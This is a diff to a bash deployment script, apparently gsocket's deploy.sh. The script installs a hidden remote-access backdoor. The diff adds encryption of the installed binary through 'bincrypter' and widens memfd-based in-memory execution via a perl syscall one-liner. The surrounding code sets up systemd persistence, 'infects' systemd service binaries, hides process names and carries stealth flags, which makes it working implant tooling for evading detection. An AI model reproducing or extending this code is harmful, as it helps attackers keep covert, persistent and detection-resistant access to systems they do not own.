@@ -48,6 +48,8 @@
 #       - Try NO to infect a systemd service before any other persistency
 # GS_NOFFPID=1
 #       - Do not fast forward to a small pid.
+# GS_NOBC=1
+#       - Do not encrypt binary (bincrypter)
 # GS_NOREEXEC=1
 #       - Do not re-exec or change argv0.
 # GS_NOCCG=1
@@ -210,6 +212,7 @@ CONFIG_DIR_NAME_DEFAULT="${config_dir_name_arr[$((RANDOM % ${#config_dir_name_ar
 # GS_NOTE=1
 GS_FFPID=1
 GS_REEXEC=1
+GS_BC=1
 [ -z "$GS_SYSTEMD_PERSIST" ] && GS_SYSTEMD_PERSIST="oneshot"
 GS_MEMEXEC=1
 #GS_SYSTEMD_PERSIST="default"
@@ -219,6 +222,7 @@ GS_MEMEXEC=1
 [ -n "$GS_NOFFPID" ] && unset GS_FFPID
 [ -n "$GS_NOREEXEC" ] && unset GS_REEXEC
 [ -n "$GS_NOMEMEXEC" ] && unset GS_MEMEXEC
+[ -n "$GS_NOBC" ] && unset GS_BC
 unset SYSTEMD_INSTALL_CHECK_IS_ACTIVE
 
 # systemd candidates for binary infection
@@ -283,6 +287,18 @@ if [[ -z "$GS_DEBUG" ]]; then
 else
 	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
 fi
+
+# Replaced during release-build with _bincrypter() from https://github.com/hackerschoice/bincrypter:
+# sed -n '/%%BEGIN_BC_FUNC%%/,/%%END_BC_FUNC%%/p' <bincrypter.sh | grep -vE '(^\s*$|^\s*\#)' >/tmp/b.sh
+# perl -ne 'print; if (/%%BINCRYPTER_HOOK%%/) { open($i,"<","/tmp/b.sh"); print(<$i>); }; ' <deploy.sh >y
+# %%BINCRYPTER_HOOK%%
+declare -F _bincrypter >/dev/null || {
+	# Fallback to bincrypter binary (if installed; mostly for development)
+	command -v bincrypter >/dev/null && {
+		DEBUGF "Using systemwide bincrypter"
+		_bincrypter() { bincrypter "$@"; }
+	}
+}
 
 _ts_fix()
 {
@@ -1123,7 +1139,7 @@ _config2bin_memexec() {
 
 	[[ "$src" != "$dst" ]] && return 255
 
-	GS_CONFIG_WRITE="${dst}" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3"' <"$src" &>/dev/null || return 255
+	GS_CONFIG_WRITE="${dst}" LANG=C perl '-efor(319,279,385,4314,4354){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3"' <"$src" &>/dev/null || return 255
 
 	return 0
 }
@@ -1167,17 +1183,19 @@ _config2bin_withenv() {
 }
 
 config2bin() {
+	local src="$1"
+	local dst="$2"
 	local opts="$3"
 	local proc_hidden_name="$4"
 
-	GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_ARGS="${opts}" TERM=xterm-256color GS_CCG="${GS_CCG}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_REEXEC="${GS_REEXEC}" GS_STEALTH=1 GS_SECRET="${GS_SECRET:?}" _config2bin_withenv "$@"
+	GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_ARGS="${opts}" TERM=xterm-256color GS_CCG="${GS_CCG}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_REEXEC="${GS_REEXEC}" GS_STEALTH=1 GS_SECRET="${GS_SECRET:?}" _config2bin_withenv "$src" "$dst"
 }
 
 # Load configuration from TARGET by executing EXE.
 # exe target
 bin2config() {
 	local exe="$1"
-	local bin="$2"
+	local bin="$2" # can be empty
 	local exec_arr=()
 
 	unset GS_CONFIG_SECRET
@@ -1207,7 +1225,7 @@ uninstall_rm()
 }
 
 uninstall_bin_rm() {
-	bin2config "$1" "$1" && [[ -n "$GS_CONFIG_PROC_HIDDENNAME" ]] && UNINST_PROC_HN_ARR+=("$GS_CONFIG_PROC_HIDDENNAME")
+	bin2config "$1" && [[ -n "$GS_CONFIG_PROC_HIDDENNAME" ]] && UNINST_PROC_HN_ARR+=("$GS_CONFIG_PROC_HIDDENNAME")
 	uninstall_rm "$@"
 }
 
@@ -1449,7 +1467,7 @@ gs_secret_reload_systemd_infect() {
 
 	for bin in "${INFECT_BIN_NAME_ARR[@]}"; do
 		[[ ! -f "${bin} " ]] && continue
-		bin2config "${bin}" "${bin}" && {
+		bin2config "${bin}" && {
 			INFECTED_BIN_NAME="${bin}"
 			unset DSTBIN
 			unset DSTBIN_EXEC_ARR
@@ -1468,7 +1486,7 @@ gs_secret_load_user() {
 		for f in "${bin_hidden_name_arr[@]}"; do
 			fn="${GS_PREFIX}${GS_DSTDIR}/${f}"
 			DEBUGF "Checking ${fn}"
-			[[ -f "${fn}" ]] && bin2config "${fn}" "${fn}" && { DSTBIN="${fn}"; return 0; }
+			[[ -f "${fn}" ]] && bin2config "${fn}" && { DSTBIN="${fn}"; return 0; }
 		done
 
 		return 255
@@ -1478,7 +1496,7 @@ gs_secret_load_user() {
 		for f in "${bin_hidden_name_arr[@]}"; do
 			fn="${GS_PREFIX}${HOME}/.config/${d}/${f}"
 			DEBUGF "Checking ${fn}"
-			[[ -f "${fn}" ]] && bin2config "${fn}" "${fn}" && { DSTBIN="${fn}"; return 0; }
+			[[ -f "${fn}" ]] && bin2config "${fn}" && { DSTBIN="${fn}"; return 0; }
 		done
 	done
 
@@ -1492,7 +1510,7 @@ gs_secret_load_system() {
 	for f in "${bin_hidden_name_arr[@]}"; do
 		fn="${d}/${f}"
 		DEBUGF "Checking ${fn}"
-		[[ -f "${fn}" ]] && bin2config "${fn}" "${fn}" && { DSTBIN="${fn}"; return 0; }
+		[[ -f "${fn}" ]] && bin2config "${fn}" && { DSTBIN="${fn}"; return 0; }
 	done
 
 	return 255
@@ -1519,7 +1537,7 @@ gs_secret_reload() {
 	# systemd-install not found.
 	# Try to load from binary if it exists:
 	# User may set DSTDIR= and GS_NAME=
-	[[ -f "${DSTBIN:?}" ]] && bin2config "${DSTBIN}" "${DSTBIN}" && exit_installed
+	[[ -f "${DSTBIN:?}" ]] && bin2config "${DSTBIN}" && exit_installed
 
 	# If GS_DSTDIR is set then look _only_ in the GS_DSTDIR
 	gs_secret_load_user && exit_installed
@@ -1574,11 +1592,29 @@ do_config2bin() {
 	OK_OUT
 }
 
+do_bincrypter() {
+	local dst="$1"
+	local str
+
+	[ -z "$GS_BC" ] && return
+	str="Bincrypter........................................................................."
+	[ -n "$BC_LOCK" ] && str="Bincrypter (BC_LOCK=${BC_LOCK:0:10}...)........................................................................."
+	echo -en "${str:0:70}"
+
+	declare -F _bincrypter >/dev/null || {
+		SKIP_OUT "bincrypter not available"
+		return 0 # continue
+	}
+	BC_QUIET=1 _bincrypter "${dst}"
+	OK_OUT
+}
+
 install_systemd_add() {
 	local sfdata="$1"
 	local param="$2"
 	local len="70"
 	do_config2bin "${DSTBIN}" "${DSTBIN}" "${param:--ilq}" "${PROC_HIDDEN_NAME}" || return 255
+	do_bincrypter "${DSTBIN}"
 
 	[[ -n "$CDC" ]] && ((len+=11)) 
 	printf "%-${len}.${len}s" "$(echo -e "Installing as systemd ${CB}${SERVICE_HIDDEN_NAME}.service${CN}..............................................")"
@@ -1841,6 +1877,7 @@ install_user()
 	}
 
 	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" "${PROC_HIDDEN_NAME}" || return 255
+	do_bincrypter "${DSTBIN}"
 }
 
 ask_nocertcheck() {
@@ -2313,6 +2350,7 @@ WARN_EXECFAIL
 if [[ -z $GS_NOINST ]]; then
 	if [[ -n $IS_DSTBIN_TMP ]]; then
 		do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilD" "${PROC_HIDDEN_NAME}"
+		do_bincrypter "${DSTBIN}"
 		echo -en "Installing remote access.............................................."
 		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
 	else
@@ -2324,6 +2362,7 @@ if [[ -z $GS_NOINST ]]; then
 	fi
 else
 	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilD" "${PROC_HIDDEN_NAME}"
+	do_bincrypter "${DSTBIN}"
 	echo -en "Installing remote access.............................................."
 	SKIP_OUT "${CDC}GS_NOINST=1${CN} is set."
 fi
